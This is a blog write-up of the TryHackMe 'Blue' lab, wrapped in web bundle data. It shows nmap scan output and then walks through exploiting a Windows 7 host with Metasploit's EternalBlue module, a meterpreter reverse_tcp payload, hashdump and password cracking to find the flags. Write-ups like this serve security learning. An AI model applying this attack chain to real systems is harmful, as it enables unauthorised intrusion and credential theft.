Writeup","image":"/img/THM/blue.png"},"prevItem":{"title":"welcome","permalink":"/Cybernotes/blog/welcome"}},"content":"Hello everyone,\\n\\nToday we are going to solve blue machine from Tryhackme. we will see how to enumrate windows machine,how to crack hashes and how to use msfconsole in this room.\\n\\n![](/img/THM/blue.png)\\n\\n\x3c!--truncate--\x3e\\n\\nSo let\'s start...\\n\\n## Nmap results\\n\\n```bash\\nPORT      STATE SERVICE            VERSION\\n135/tcp   open  msrpc              Microsoft Windows RPC\\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\\n445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\\n3389/tcp  open  ssl/ms-wbt-server?\\n| ssl-cert: Subject: commonName=Jon-PC\\n| Not valid before: 2021-07-11T16:51:30\\n|_Not valid after:  2022-01-10T16:51:30\\n|_ssl-date: 2021-07-12T16:53:44+00:00; +1s from scanner time.\\n49152/tcp open  msrpc              Microsoft Windows RPC\\n49153/tcp open  msrpc              Microsoft Windows RPC\\n49154/tcp open  msrpc              Microsoft Windows RPC\\n49158/tcp open  msrpc              Microsoft Windows RPC\\n49160/tcp open  msrpc              Microsoft Windows RPC\\nService Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nHost script results:\\n|_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s\\n|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:9f:c6:68:b1:03 (unknown)\\n| smb-os-discovery:\\n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\\n|   Computer name: Jon-PC\\n|   NetBIOS computer name: JON-PC\\\\x00\\n|   Workgroup: WORKGROUP\\\\x00\\n|_  System time: 2021-07-12T11:53:37-05:00\\n| smb-security-mode:\\n|   account_used: <blank>\\n|   authentication_level: user\\n|   challenge_response: supported\\n|_  message_signing: disabled (dangerous, but default)\\n| smb2-security-mode:\\n|   2.02:\\n|_    Message signing enabled but not required\\n| smb2-time:\\n|   date: 2021-07-12T16:53:37\\n|_  start_date: 2021-07-12T16:51:28\\n```\\n\\n\x3c!--truncate--\x3e\\n\\n## msfconsole\\n\\n--\x3e i searched for eternal blue exploit and found this in metasploit\\n\\n![](Attachments/Pastedimage20210712130527.png)\\n\\n--\x3e then set the options\\n\\n![](Attachments/Pastedimage20210712130556.png)\\n\\n--\x3e if you want meterpreter shell then use this payload\\n\\n```c\\nwindows/x64/meterpreter/reverse_tcp\\n```\\n\\n--\x3e now exploit the payload and i got shell !\\n\\n---\\n\\n## Privesc\\n\\n--\x3e i typed hashdump and found password hashes for user and root\\n\\n--\x3e so Let\'s crack them\\n\\n![](Attachments/Pastedimage20210712133425.png)\\n\\n--\x3e and i got the password for Jon\\n\\n![](Attachments/Pastedimage20210712134201.png)\\n\\n---\\n\\n### Flag finding\\n\\n--\x3e i got first flag at c directory\\n\\n![](Attachments/Pastedimage20210712133451.png)\\n\\n--\x3e we can\'t use cat here so we have to use **more** command to read the file\\n\\n![](Attachments/Pastedimage20210712133507.png)\\n\\n--\x3e i got second password at c:\\\\Windows\\\\system32\\\\config where the passwords are stored within Windows\\n\\n![](Attachments/Pastedimage20210712133600.png)\\n\\n--\x3e and i got 3rd flag at C:\\\\Users\\\\Jon\\\\Documents\\n\\n![](Attachments/Pastedimage20210712134022.png)\\n\\n==> and we completed the machine !\\n\\n---"}]}')}}]);